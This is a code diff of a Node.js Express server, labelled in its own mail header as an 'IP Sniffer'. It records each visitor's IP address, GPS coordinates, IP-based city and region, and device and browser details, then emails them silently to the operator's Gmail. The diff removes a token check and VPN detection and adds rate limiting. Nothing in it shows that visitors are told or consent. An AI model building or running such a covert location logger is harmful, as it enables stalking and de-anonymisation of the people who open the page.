@@ -1,49 +1,55 @@
-// server.js
 require('dotenv').config();
 const express = require('express');
 const nodemailer = require('nodemailer');
-const crypto = require('crypto');
 const uaParser = require('ua-parser-js');
 const fetch = require('node-fetch');
 const app = express();
 
-app.use(express.static('public'));
 app.use(express.json());
+app.use(express.static('public'));
 
-const validTokens = new Set();
+// スパム対策：IPごとの送信記録
+const recentAccessMap = new Map();
 
-// トークン発行API
-app.get('/token', (req, res) => {
-  const token = crypto.randomBytes(16).toString('hex');
-  validTokens.add(token);
-  setTimeout(() => validTokens.delete(token), 300000);
-  res.json({ token });
-});
-
-// 通報API
 app.post('/report', async (req, res) => {
-  const token = req.headers['authorization'];
-  if (!token || !validTokens.has(token)) return res.status(403).json({ error: '不正トークン' });
-  validTokens.delete(token);
+  const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+  const ip = rawIp.split(',')[0].trim();
 
-  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress).split(',')[0].trim();
-  const ua = uaParser(req.headers['user-agent']);
+  // スパム防止：10秒に1回のみ許可
+  const lastAccess = recentAccessMap.get(ip);
+  const now = Date.now();
+  if (lastAccess && now - lastAccess < 10 * 1000) {
+    return res.status(429).send('スパム防止：しばらく待ってください');
+  }
+  recentAccessMap.set(ip, now);
+
+  // ユーザーエージェント取得・検証
+  const uaRaw = req.headers['user-agent'] || '';
+  if (!uaRaw) return res.status(400).send('不正なアクセス');
+
+  const ua = uaParser(uaRaw);
+
+  // 緯度経度検証（空や不正値の弾き）
   const { latitude, longitude } = req.body;
-  const locationLink = `https://maps.google.com?q=${latitude},${longitude}`;
+  if (
+    !latitude || !longitude ||
+    isNaN(latitude) || isNaN(longitude)
+  ) {
+    return res.status(400).send('位置情報が正しくありません');
+  }
 
+  const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+  // IPベース位置情報取得（無料）
   let geo = {};
   try {
-    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,isp,proxy,hosting,mobile`);
-    geo = await response.json();
-  } catch (e) {
-    console.error('Geoエラー:', e);
+    const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
+    geo = await geoRes.json();
+  } catch (err) {
+    console.error('IPジオAPIエラー:', err);
   }
 
-  // VPN/Proxy判定
-  if (geo.proxy || geo.hosting) {
-    return res.status(403).json({ redirect: '/warning.html' });
-  }
-
+  // Gmail設定
   const transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
@@ -53,37 +59,33 @@ app.post('/report', async (req, res) => {
   });
 
   const mailOptions = {
-    from: `IP Tracker <${process.env.GMAIL_USER}>`,
+    from: `IP Sniffer <${process.env.GMAIL_USER}>`,
     to: process.env.GMAIL_USER,
-    subject: '📡 アクセス通知（統合版）',
+    subject: '📡 アクセス情報通知（無料構成）',
     text: `
-IPアドレス: ${ip}
-国: ${geo.country || '不明'}
-地域: ${geo.regionName || '不明'}
-市区町村: ${geo.city || '不明'}
-ISP: ${geo.isp || '不明'}
-緯度/経度: ${latitude} / ${longitude}
-Google Maps: ${locationLink}
-端末種別: ${ua.device.type || 'PC'}
-端末ベンダー: ${ua.device.vendor || '不明'}
-端末モデル: ${ua.device.model || '不明'}
-OS: ${ua.os.name} ${ua.os.version}
-ブラウザ: ${ua.browser.name} ${ua.browser.version}
-リファラー: ${req.headers['referer'] || 'なし'}
-時間: ${new Date().toLocaleString()}
+📡 アクセス情報：
+- IPアドレス: ${ip}
+- 国: ${geo.country || '不明'}
+- 地域: ${geo.regionName || '不明'}
+- 市区町村: ${geo.city || '不明'}
+- 緯度/経度: ${latitude} / ${longitude}
+- Google Maps: ${locationLink}
+- 端末: ${ua.device.type || 'PC'} / ${ua.os.name || '不明'} / ${ua.browser.name || '不明'}
+- アクセス時間: ${new Date().toLocaleString()}
     `
   };
 
   try {
     await transporter.sendMail(mailOptions);
-    console.log('✅ Gmail送信成功');
-  } catch (err) {
-    console.error('❌ Gmail送信失敗:', err);
+    console.log(`[✔] メール送信完了 - ${ip}`);
+  } catch (error) {
+    console.error(`[✖] メール送信失敗 - ${ip}`, error);
   }
 
   res.sendStatus(200);
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`📡 Listening on http://localhost:${PORT}`));
-
+app.listen(PORT, () => {
+  console.log(`📡 Server running on http://localhost:${PORT}`);
+});
